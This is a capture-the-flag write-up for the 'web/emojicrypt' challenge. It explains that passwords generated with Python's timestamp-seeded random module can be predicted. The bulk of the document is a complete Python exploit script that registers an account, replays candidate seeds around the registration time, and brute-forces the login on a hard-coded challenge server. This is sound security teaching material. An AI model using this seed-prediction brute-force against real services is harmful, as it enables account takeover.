
# Writeup for `web/emojicrypt`, Hacking Time and Randomization

## Vulnerability Overview

`web/emojicrypt` Uses `random.choice(NUMBERS)  for  _  in  range(32)` with the default seed. Normally, in python3, the default seed is the current Unix timestamp. (See https://www.unixtimestamp.com/ for more explanation on the Unix Timestamp format.) Because of this, we can simply find out the timestamp by going from 50 seeds before the timestamp to 50 seeds after, allowing us to find out the password.

## Application Architecture

The application consists of:
1. A web frontend that allows users to login and register
2. A random password generator via `random_password  =  ''.join(random.choice(NUMBERS)  for  _  in  range(32))`
3. A simple database accessed by `DATABASE  =  'users.db'` and `cursor.execute("SELECT salt, password_hash FROM users WHERE username = ?",  (username,))` 

## Vulnerability Details

The vulnerability exists in the `register()` function, specifically in line 46:

```python
random_password  =  ''.join(random.choice(NUMBERS)  for  _  in  range(32))
```

Looking at the definition of python's `random.seed()` function, it states that:

`None or no argument seeds from current time or from an operating system specific randomness source if available.`

Which means that since the server is running on Linux, we can assume that the seed is derived from the Unix Time-stamp. which means that we can potentially get the seed just by looking at the time.

## Exploit Chain
To demonstrate this part of the writeup, we will pretend that english is code.
1. First, Register an account:

```
unique_suffix  =  randnum(1000,9999)
Username = "Wehacking" + unique_suffix	
Email  =  "exploit_(unique_suffix)@example.com"
timebeforeregister = gettimebeforeregister
startsession
payload = {'username' : Username, 'email' : Email}
post(payload)
if respcode is 200:
	print its working!!
```
	


2. Do the following:
   - have a variable thats `timebeforegister` + 1 and `timebeforegister` - 50
   - Then loop thru each of these numbers generating an instance of that seed (like `1744021834`,`1744021835`,`1744021836` and so on.
   - Generate a password with each seed
   - Try each password until you get the correct password.

## Root Cause Analysis


1. **Poor Time-Based Attack Mitigation**: The application relies on time-based values (the Unix timestamp) to seed the random generator. This is insecure because an attacker can brute-force possible seeds within a range of Unix timestamps, giving them a manageable set of seeds to test.
2. **Lack of Rate-Limiting or Delays**: The application is vulnerable to brute-force attacks by allowing to repeatedly try passwords within a small window without rate-limiting or delays between attempts. Because of this, the attacker can try a large number of passwords in a short amount of time, reducing the effort needed to guess the correct password.

## Automation Code
```py 
import requests
import random
import time
import sys

# --- Configuration ---
# <<< CHANGE MADE HERE >>>
BASE_URL = "http://52.188.82.43:8060"
# <<< END CHANGE >>> 

REGISTER_URL = f"{BASE_URL}/register"
LOGIN_URL = f"{BASE_URL}/login"


unique_suffix = str(random.randint(1000, 9999)) # Add randomness 
USERNAME = f"exploit_user_{unique_suffix}"
EMAIL = f"exploit_{unique_suffix}@example.com"

# Constants from the Flask app (ensure these match the target server)
EMOJIS = ['🌀', '🌁', '🌂', '🌐', '🌱', '🍀', '🍁', '🍂', '🍄', '🍅', '🎁', '🎒', '🎓', '🎵', '😀', '😁', '😂', '😕', '😶', '😩', '😗']
NUMBERS = '0123456789'
 
# How many seconds around the registration time to check for seeds
SEED_SEARCH_RANGE_SECONDS = 50 # Increased slightly for potential network delay/clock skew

# --- Exploit Logic ---

print(f"Targeting server: {BASE_URL}")
print(f"Attempting to register user: {USERNAME} / {EMAIL}")

# Get time just before registration
start_time = time.time()
registration_timestamp_guess = int(start_time)

try:
    # Use a session to handle cookies if necessary
    session = requests.Session()

    register_payload = {
        'username': USERNAME,
        'email': EMAIL
    }
    # Attempt registration
    reg_response = session.post(REGISTER_URL, data=register_payload, timeout=15) # Increased timeout
    print(f"Registration attempt status: {reg_response.status_code}")

    # Check if registration seemed successful (redirect expected, or 400 if user exists)
    if reg_response.status_code == 200:
        print("Registration successful.")
    elif reg_response.status_code == 400:
        print("Registration failed (status 400) - User likely already exists. Trying to log in anyway.")

    else:
         print(f"Warning: Unexpected registration status code: {reg_response.status_code}")
         print(f"Response text: {reg_response.text}")
         # Continue anyway, maybe it still worked enough

except requests.exceptions.RequestException as e:
    print(f"Error during registration: {e}")
    sys.exit(1)

print(f"Registration attempt finished. Estimated timestamp: {registration_timestamp_guess}")
print(f"Searching seeds from {registration_timestamp_guess - SEED_SEARCH_RANGE_SECONDS} to {registration_timestamp_guess + SEED_SEARCH_RANGE_SECONDS}")

found_flag = False
# Iterate through potential seeds (timestamps around registration time)
for seed_offset in range(-SEED_SEARCH_RANGE_SECONDS, SEED_SEARCH_RANGE_SECONDS + 1):
    current_seed = registration_timestamp_guess + seed_offset
    
    print(f"[*] Trying seed: {current_seed}...")
    

    # Seed the local random generator
    random.seed(current_seed)

    # --- Simulate server's random generation ---
    # 1. Simulate salt generation (advance the PRNG state 12 times)
    _ = random.choices(EMOJIS, k=12)

    # 2. Simulate password generation (next 32 random choices)
    predicted_password = ''.join(random.choice(NUMBERS) for _ in range(32))

    # --- Attempt Login ---
    login_payload = {
        'username': USERNAME,
        'password': predicted_password
    }

    try:
     
        login_response = session.post(LOGIN_URL, data=login_payload, allow_redirects=False, timeout=10)

        if login_response.status_code == 200:
            # Print a newline to clear the "... trying seed" line
            print("\n" + "="*20)
            print(f"[+] SUCCESS! Found correct password with seed: {current_seed}")
            print(f"[+] Used Username: {USERNAME}")
            print(f"[+] Predicted Password: {predicted_password}")
            print(f"[+] Flag/Response:")
            # Try to decode if bytes, otherwise print text
            try:
                print(login_response.content.decode('utf-8'))
            except UnicodeDecodeError:
                print(login_response.content) 
            print("="*20 + "\n")
            found_flag = True
            break 

    except requests.exceptions.Timeout:
       
        print(f"[!] Timeout during login attempt with seed {current_seed}. Trying next...", ' '*20, end='\r')
        sys.stdout.flush()
        # Continue to the next seed
    except requests.exceptions.RequestException as e:
        # Print a newline to clear the "... trying seed" line
        print("\n")
        print(f"[!] Error during login attempt with seed {current_seed}: {e}")
        # Potentially add a small delay before continuing if errors persist
        time.sleep(0.5)
        # Continue to the next seed

# Clear the "Trying seed..." line if loop finishes without success
print(" " * 80, end='\r')

if not found_flag:
    print("\n[-] Exploit failed. Could not find the correct password within the seed range.")
    
```
